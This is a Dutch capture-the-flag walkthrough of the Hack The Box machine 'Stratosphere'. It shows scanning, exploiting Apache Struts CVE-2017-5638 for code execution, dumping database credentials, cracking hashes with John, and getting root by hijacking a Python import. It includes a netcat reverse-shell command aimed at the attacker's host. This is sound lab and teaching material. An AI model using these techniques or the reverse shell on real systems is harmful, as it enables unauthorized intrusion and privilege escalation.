# Stratosphere

## Low privilege

Eerst begin ik met een Nmap scan:

``` nmap -sV -p- -T5 -oN 10.10.10.64.nmap```

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/1.PNG" />

<ul>
	<li>sV: Probeer versie namen te vinden</li>
	<li>-p-: Scan alle TCP poorten </li>
	<li>-T5: Scan snel en aggresief</li>
	<li>-oN: Save output als Nmap formaat </li>
</ul>


Er is een webserver dus draai ik meteen een dirbsearch scan:

```python3 dirsearch.py -u http://10.10.10.64 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php -t 25 ```

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/2.PNG" />
Argumenten spreken voor zich neem ik aan.

Wanneer ik naar /Monitoring navigeer word ik omgeleid naar http://10.10.10.64/Monitoring/example/Welcome.action. Ik wist niet precies wat er bij .action bestanden hoorden dus had ik dat opgezocht op Google.

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/3.PNG" />

Ik lees Struts, dus weet ik genoeg.

```searchsploit -x linux/webapps/41570.py ```

Dit is een Python script dat CVE-2017-5638 probeert te exploiteren.

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/4.PNG" />

Hoppa, remote code execution! Het is nu de bedoeling dat ik een shell krijg, en dat is niet zo moeilijk. In plaats van ```echo "Gio" ``` als commando te gebruiken gebruik ik een commando waarmee ik dus een shell kan krijgen. De commando die ik meestal gebruik is: ```nc -e /bin/sh [Mijn tunnel ip] 1234 ```. Maar dit werkt niet, sterker nog geen één reverse shell commando werkt, dit kom waarschijnlijk omdat de script niet kan blijven hangen maar een error gooit. 

Ongeveer 2 uur later is mijn irritatie grens bereikt en probeer ik te kijken of er misschien andere interesante dingen zijn. Het eerste wat ik dan doe is kijken of de webserver database credentials lekt en met deze proberen in te loggen. Ik zie (via het Python script) dat er een ``db_connect`` bestaat, en deze bevatten de database credentials :).

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/5.PNG" />

Oké vet, maar ik heb geen shell dus is het niet echt mogelijk om een interactieve MySQL shell te krijgen. Na een tijdje door de man pagina van MySQL te hebben gebladerd kwam ik iets heel interesant tegen:

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/6.PNG" />

Hierdoor is het mogelijk om statements uit te voeren zonder een interactieve shell te hebben. Dus, ik weet de credentials van de database en ik heb een manier gevonden om statements uit te voeren.

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/7.PNG" />

Dit ziet er héél lekker uit. Hier zie ik een gebruiker genaamd Richard en zijn wachtwoord. Dit zijn vast ook zijn SSH credentials.

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/8.PNG" />

Boom, ez lyfe.

## Privilege escalation

Het eerste dat ik doe als ik user ben op een machine is kijken of die user bestanden mag openen als root, dit doe ik doormiddel van de commando `` sudo -l ``

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/9.PNG" />

Het ziet er naar uit dat ik `` /home/richard/test.py `` mag uitvoeren als root. eens kijken wat dat script precies doet:

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/10.PNG" />

Dit ziet er naar uit dat dit een soort <l>Solve-the-hash(?)</l> challenge is en zodra je alles goed heb het /root/success.py uitvoert. In het script staat precies welke algoritme bij welke hash hoort. ```John``` is een tool die dit voor mij kan oplossen.

Eerste hash: `` john --format=raw-md5 --wordlist=~/rockyou.txt hash # kaybboo!`` <br>
Tweede hash: `` john --format=raw-sha1 --wordlist=~/rockyou.txt hash # ninjaabisshinobi`` <br>
Derde  hash: `` john --format=raw-md4 --wordlist=~/rockyou.txt hash # legend72`` <br>
Vierde hash: `` john --format=raw-blake2 --wordlist=~/rockyou.txt hash # Fhero6610 `` <br>

#### NOTE: Je moet persé de volledige paden gebruiken zoals aangegeven in sudo -l
##### Dus geen `` sudo python test.py`` , maar `` sudo /usr/bin/python3 /home/richard/test.py ``

Oké, ik heb nu van alle hashes de plaintext vorm. Kijken wat er gebeurt als ik het invoer:

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/11.PNG" />

k, nice scam. De challenge was dus een rabbit hole, want /root/success.py bestaat niet. Het aanpassen van het script is ook niet mogelijk aangezien ik alleen execute rechten heb, en het bestand een andere naam geven lukt ook niet. Dus de kwetsbaarheid zit 100% in het script zelf. 

Na het eindeloos analyseren van het script viel het me ineens op dat bovenaan het script hashlib wordt geïmporteerd. Nu weet ik toevallig dat lokale bestanden voorrang hebben wanneer iets geïmporteerd wordt. Wat ik nu ga proberen is zelf `` hashlib.py`` te maken met de functie `` md5`` om vervolgens te kijken of dit daadwerkelijk het geval is.

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/12.PNG" />

Zoals je ziet is het een simpele Python script met alleen een functie dat "Gio" print. Eens kijken wat er nu gebeurt als ik test.py uitvoer.

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/13.PNG" />

Ja hoor! Net voor de error staat "Gio", dit betekent dat ik willekeurige Python code kan uitvoeren als de gebruiker root. 
Python heeft functies im systeem commando's aan te roepen, en aangezien ik weet dat de code wordt gebruikt is het een kwesite van hashlib aanpassen en root worden.

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/14.PNG" />

Als alles klopt ben ik nadat ik iets willekeurigs invul root.

<img src="https://github.com/lilgio/hackthebox/blob/master/images/stratosphere/15.PNG" />
